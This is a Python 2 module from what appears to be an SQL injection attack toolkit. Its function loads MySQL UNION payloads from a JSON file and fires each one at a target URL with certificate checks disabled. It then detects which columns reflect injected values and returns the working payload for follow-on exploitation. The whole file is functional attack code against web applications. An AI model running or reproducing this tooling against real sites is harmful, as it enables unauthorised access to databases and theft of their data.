"""
    - created on march/27/2019
    - author topcodermc
"""

try:
    import json
    import requests

    import src.libs as lib
    from Config.WebConfig import define_headerdata
    from src.Colors import TextColor

except Exception as error:
    raise SystemExit, TextColor.RED + '[-] Some error happened for libraries as: %s' % error + TextColor.WHITE


def GetVulnerableColumns(url, numbers):
    with open('./WebAttack/sqlinjection/modules/helper/CommandGenerators/mysql/staticpayloads/unionspayload.json', 'r') \
            as file:

        commandListMysql = json.load(file)

        vulnerableColumns = list()

        usedPayload = str()

        for item in commandListMysql["payloads"]:

            response = requests.get(url=url.replace('COMMANDS', item) + " %23", headers=define_headerdata, verify=False)

            for number in numbers:
                if response.content.find(number) is not -1:
                    vulnerableColumns.append(number)

            if len(vulnerableColumns) != 0:
                usedPayload = item
                break

        print TextColor.GREEN + "[+] vulnerable columns: " + TextColor.WHITE

        make_table = lib.mytable(['columns'])

        for item in vulnerableColumns:
            make_table.add_row([item[0]])

        print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"

        exploitedBy = dict()

        exploitedBy['payload'] = url.replace('COMMANDS', usedPayload)
        exploitedBy['vulnColumns'] = vulnerableColumns

        return exploitedBy  # => send it to unioncommands.py (./unioncommands.py)
